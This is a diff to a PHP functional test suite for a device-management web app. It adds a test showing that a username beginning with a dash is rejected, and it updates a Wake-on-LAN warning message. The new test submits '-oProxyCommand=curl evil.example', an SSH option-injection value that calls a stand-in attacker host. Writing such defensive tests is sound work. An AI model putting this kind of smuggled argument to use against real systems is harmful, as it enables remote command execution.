@@ -44,6 +44,27 @@ class DeviceControllerFunctionalTest extends HttpFunctionalTestCase
         $this->assertCount(0, static::getContainer()->get(DeviceService::class)->listDevices());
     }
 
+    public function testNewRejectsUsernameThatSshWouldParseAsAnOption(): void
+    {
+        $this->createSimpleUser('admin', 'secret-1');
+        $this->loginAsSimpleUser('admin', 'secret-1', '/devices');
+
+        $response = $this->request('POST', '/devices/new', [
+            'name' => 'node-1',
+            'ip' => '10.0.0.10',
+            'mac' => '00:11:22:33:44:55',
+            'platform' => DevicePlatform::LINUX->value,
+            'username' => '-oProxyCommand=curl evil.example',
+            'ups_id' => '',
+            'threshold_minutes' => '',
+        ]);
+
+        $this->assertSame(Response::HTTP_OK, $response->getStatusCode());
+        $content = html_entity_decode((string)$response->getContent(), ENT_QUOTES);
+        $this->assertStringContainsString('cannot start with a dash', $content);
+        $this->assertCount(0, static::getContainer()->get(DeviceService::class)->listDevices());
+    }
+
     public function testNewCreatesDeviceAndRedirectsToIndex(): void
     {
         $this->createSimpleUser('admin', 'secret-1');
@@ -279,7 +300,10 @@ class DeviceControllerFunctionalTest extends HttpFunctionalTestCase
         $indexResponse = $this->request('GET', '/devices');
         $this->assertSame(Response::HTTP_OK, $indexResponse->getStatusCode());
         $content = html_entity_decode((string)$indexResponse->getContent(), ENT_QUOTES);
-        $this->assertStringContainsString("Device 'node-start-warning' started: no.", $content);
+        $this->assertStringContainsString(
+            "Wake-on-LAN packet could not be sent to device 'node-start-warning'.",
+            $content
+        );
     }
 
     protected function assertDevicesOrder(string $content, array $orderedDeviceNames): void
